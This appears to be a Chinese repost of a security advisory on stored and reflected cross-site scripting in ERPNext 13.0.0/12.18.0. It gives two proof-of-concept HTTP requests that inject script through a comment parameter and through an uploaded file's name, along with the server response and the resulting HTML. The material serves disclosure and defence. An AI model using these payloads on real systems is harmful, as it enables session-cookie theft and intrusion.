# ERPNext 13.0.0/12.18.0 中的多个XSS漏洞

Trovent Security GmbH在当前的ERPNext软件版本（13.0.0和12.18.0）中发现了多个跨站点脚本漏洞。攻击者可能利用此攻击来窃取会话cookie，安装JavaScript键盘记录程序等。

poc：

```
POST /api/method/frappe.desk.form.utils.add_comment HTTP/1.1
Host: sqlprodtest.local:1080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d875
X-Frappe-CMD:
X-Requested-With: XMLHttpRequest
Content-Length: 157
Origin: http://sqlprodtest.local:1080
Connection: close
Referer: http://sqlprodtest.local:1080/desk
Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=;io=Ly9MpKRfK_nrKpurAAAN

reference_doctype=User&reference_name=%3cscript%3ealert(1)%3c%2fscript%3e&content=xsstest&comment_email=Administrator
RESPONSE (removed the Stack Trace for better readability):

HTTP/1.1 417 EXPECTATION FAILED
Server: nginx/1.19.7
Date: Thu, 11 Mar 2021 14:23:05 GMT
Content-Type: application/json
Content-Length: 1894
Connection: close
Set-Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; Expires=Sun, 14-Mar-2021 14:23:05 GMT; Path=/
Set-Cookie: system_user=yes; Path=/
Set-Cookie: full_name=Administrator; Path=/
Set-Cookie: user_id=Administrator; Path=/
Set-Cookie: user_image=; Path=/

{"exc_type":"LinkValidationError","exc":"[\"Traceback (...)]","_server_messages":"[\"{\\\"message\\\": \\\"Could not find Reference Name: <script>alert(1)</script>\\\", \\\"indicator\\\": \\\"red\\\", \\\"raise_exception\\\": 1}\"]"}
```

poc：

```
POST /api/method/upload_file HTTP/1.1
Host: sqlprodtest.local:1080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d875
Content-Type: multipart/form-data; boundary=---------------------------173872902410009950314171894076
Content-Length: 74566
Origin: http://sqlprodtest.local:1080
Connection: close
Referer: http://sqlprodtest.local:1080/desk
Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=; io=o0Bglip9YmrzxZj9AAAX

-----------------------------173872902410009950314171894076
Content-Disposition: form-data; name="file"; filename="user-enum.png\" onmouseover=\"alert(1234)\""
Content-Type: image/png

PNG
(...)


HTML code snippet from erpnext-server.com/desk#List/File/Home.
The user is able to escape the context of the title attribute and add an onmouseover event which triggers the JavaScript:

<div class="level list-row small">
<div class="level-left ellipsis">

<div class="list-row-col ellipsis list-subject level">
<input class="level-item list-row-checkbox hidden-xs" type="checkbox" data-name="a5ff65f666">
<span class="level-item  ellipsis" title="user-enum.png" onmouseover="alert(1234)" "="">
<a class="ellipsis" href="#Form/File/a5ff65f666" title="user-enum.png" onmouseover="alert(1234)" "="">

<i class="octicon octicon-file-text text-muted" style="width: 16px;"></i>
<span>user-enum.png" onmouseover="alert(1234)"</span>
```

ref：

https://trovent.io/security-advisory-2103-02